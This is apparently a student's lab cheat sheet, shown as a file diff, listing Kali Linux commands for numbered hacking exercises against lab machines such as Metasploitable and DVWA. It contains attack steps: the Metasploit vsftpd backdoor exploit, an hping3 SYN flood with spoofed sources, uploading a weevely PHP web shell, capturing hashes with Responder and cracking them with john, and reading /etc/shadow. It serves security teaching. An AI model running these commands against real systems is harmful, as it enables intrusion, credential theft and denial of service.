@@ -1,0 +1,367 @@
+1
+Nmap
+nmap -sV 10.0.2.4
+searchsploit vsftpd 2.3.4
+
+New terminal:
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+show info
+show options
+set RHOSTS 10.0.2.4
+exploit
+mkdir
+rmdir
+cd .. 
+
+Hping3
+sudo apt install hping3
+hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 10.0.2.4
+hping3 -c 15000 -d 120 -p 80 -S --flood --rand-source 10.0.2.4 
+
+
+2
+
+httrack
+httrack https://www.rvce.edu.in/
+
+
+3
+
+crunch 1 5 yashu 
+
+
+
+
+
+4
+Macchanger
+ifconfig eth0 down
+macchanger -r eth0
+macchanger -m  b2:00:c3:0b:a1:1b  eth0
+macchanger -s eth0
+macchanger -p eth0
+ifconfig eth0 up
+
+responder
+Bridge adopter
+responder
+responder -I eth0
+cd /usr/share/responder/logsls
+john HTTP-NTLMv2-192.168.0.118.txt
+
+
+
+5
+Weevely
+sudo su
+weevely generate 12345 attack.php
+
+Open firefox
+Metaspot  ip
+DVWA
+DVWA Security ->low
+Upload -> attack.php
+http://192.168.0.156/dvwa/hackable/uploads/attack.php
+
+Terminal
+weevely http://192.168.0.156/dvwa/hackable/uploads/attack.php 12345
+Pwd
+
+
+proxychains
+sudo apt-get install proxychains
+sudo apt-get install tor
+
+sudo service tor status
+sudo service tor start
+sudo service tor status
+
+sudo nano /etc/proxychains4.conf
+remove dynamic (comment)
+comment strict chain
+go till the end and repeat the last line for socks5
+
+sudo service tor restart
+proxychains4 firefox google.com
+myip
+
+
+
+
+
+
+
+6
+foremost
+sudo apt-get install foremost
+Select Devices->USB->JetFlash Mas
+fdisk -l
+sudo foremost -v -t jpg -i /dev/sda1 -o output
+foremost -v -q -t all -i /dev/sdb1 -o recoveredFiles
+
+sudo apt-get update && sudo apt-get install imagemagick
+display 02145405.jpg
+
+
+binwalk -B ".exe"  content
+-binwalk -e ".exe"  compressed file extraction
+-binwalk -E ".exe" entropy graph, encryption
+
+
+
+
+
+7 
+pipal
+
+-create a txt file in pwd full of passwords
+-run "pipal pass.txt" to get stats
+-pipal -t 10 pass.txt
+-pipal -o "filename" pass.txt
+pipal -t 10 millPass.txt
+
+cutycapt --url=www.rvce.edu.in --out=/Path/Filename.jpeg
+
+
+`8
+netdiscover -r 192.168.0.159
+
+pdf-parser mozilla.pdf
+
+
+
+
+1.(a)
+nmap -sL <network>
+nmap -sn <network>
+nmap <ip_address>
+nmap -sV <ip_address>
+nmap -sC <ip_address> -p <port_number>
+ping <ip_address>
+nmap -sV <ip_address>
+searchsploit vsftpd 2.3.4
+In a new terminal execute, msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+show info
+show options
+set RHOSTS <ip_address>
+exploit
+
+1(b). hping
+sudo apt install hping3
+sudo hping3 -S <ip_address> -p <port> -c <number_of_packets>
+sudo hping3 --traceroute -V -1 <ip_address>
+sudo hping3 -a <FAKE IP> <target> -S -q -p 80 --faster     sudo hping3 -a 192.168.225.128 192.168.225.128 -S -q -p 80 --faster
+
+2(b) Httrack
+Httrack <url>
+
+3(a) John the ripper
+unshadow /etc/passwd /etc/shadow > file.txt
+(Create a password file and run it with 'john' command)
+john --single --format=raw-sha1 file.txt
+
+3(b) Crunch
+crunch <min> <max> word
+
+4(a) Macchanger
+macchanger -s eth0
+ifconfig eth0 down
+macchanger -r eth0
+ifconfig eth0 down
+macchanger -s eth0
+
+4(b) Responder
+responder -I eth0
+Enter the IP address and enter the credentials(uname and pw)
+Go to /usr/share/responder/logs and copy the file name (HTTP......)
+Run it with john to get the credentials
+
+5(a) Weevely
+weevely generate 12345 shell.php
+kali firefox-> enter metaspoilt ip
+click on dvwa, switch security to low and submit, "admin" and "password"
+go to upload n upload shell.php, copy the path from "hackable" and paste after dvwa/
+copy the entire url and enter this in the terminal: weevely "paste url here" 12345
+
+5(b) Proxychain
+cd /etc
+sudo nano "prox...4"
+remove dynamic (comment)
+comment strict chain
+go till the end and repeat the last line for socks5
+-service tor restart
+-proxychai..4 firefox google.com
+
+6(a) Foremost
+foremost -v -t jpg -i /dev/sda1 -o output
+
+6(b)
+-binwalk -B ".exe"  content
+-binwalk -e ".exe"  compressed file extraction
+-binwalk -E ".exe" entropy graph, encryption
+
+7(a) Pipal
+-create a txt file in pwd full of passwords
+-run "pipal pass.txt" to get stats
+-pipal -t 10 pass.txt
+-pipal -o "filename" pass.txt
+
+7(b) Cutycapt
+cutycapt -url=https://www.rvce.edu.in --out=outt.png
+
+8(a)Netdiscover
+
+
+
+
+1a dnmap
+ping 192.168.56.101
+nmap -sV 192.168.56.101
+searchsploit vsftpd 2.3.4
+Open a new terminal:
+sudo su
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+show info
+show options
+set RHOSTS 192.168.56.101
+exploit
+pwd
+whoami
+ls
+mkdir hack
+rmdir hack
+
+1b Hpin3
+Open whireshark-eth0
+Hping3
+sudo apt install hping3
+hping3 -c 15000 -d 120 -S  -p 80 --flood --rand-source 192.168.1.59
+
+
+2a. Burpsuit
+Open meta
+Cd /var/www/mutillidae
+Sudo nano config.inc
+Change dbname to “owasp10”
+O X
+Copy meta IP
+Open kali
+Open meta IP
+Select mutillidae-10-injec-userinfo
+Change preference to manual
+Type 127.0.0.1 and port 8080
+Check the box
+Open burpsuit
+Start-proxy
+Enter usename and password in browser
+Abc abc
+Select right click-send to intruder
+Go to intruder-pos-clear
+Select abc-add
+Select payload-load
+Path-root-users-share-wordlist-wz-injections-sql.txt
+Start attack
+39-response-renderer
+2b httrack
+Httrack <url>
+
+
+
+4(a) Macchanger
+macchanger -s eth0
+ifconfig eth0 down
+macchanger -r eth0
+ifconfig eth0 down
+macchanger -s eth0
+macchanger -e eth0
+macchanger -m b2:aa:0e:56:ed:f7 eth0
+macchanger -p eth0
+
+4b. responder
+responder -I eth0
+Enter the IP address and enter the credentials(uname and pw)
+Go to /usr/share/responder/logs and copy the file name (HTTP......)
+Run it with john to get the credentials
+
+
+
+
+
+
+
+
+5a. Weevly
+In kali type
+Weevely generate 12345 shell.php
+Open meta
+get the IP Adress
+back to kali
+open browser and type mata IP
+select-dvw-enter credentials
+dvwa security change to low
+go to upload n upload shell.php, copy the path from "hackable" and paste after dvwa/
+copy the entire url and enter this in the terminal: weevely "paste url here" 12345
+System_info
+5b. Proxychain
+Open browser type dns leak test
+cd /etc
+install tor
+service tor start
+service tor status
+ls
+sudo nano proxychains4.conf
+comment strict chain
+uncomment dubamic
+change to 5
+ctrl+o enter ctrl+X
+service tor restart
+proxychain4 firefox www.google.com enter open dns leak test
+
+7(a) Pipal
+-create a txt file in pwd full of passwords
+-run "pipal pass.txt" to get stats
+-pipal -t 10 pass.txt
+-pipal -o "filename" pass.txt
+
+7(b) Cutycapt
+cutycapt -url=https://www.rvce.edu.in --out=outt.png
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
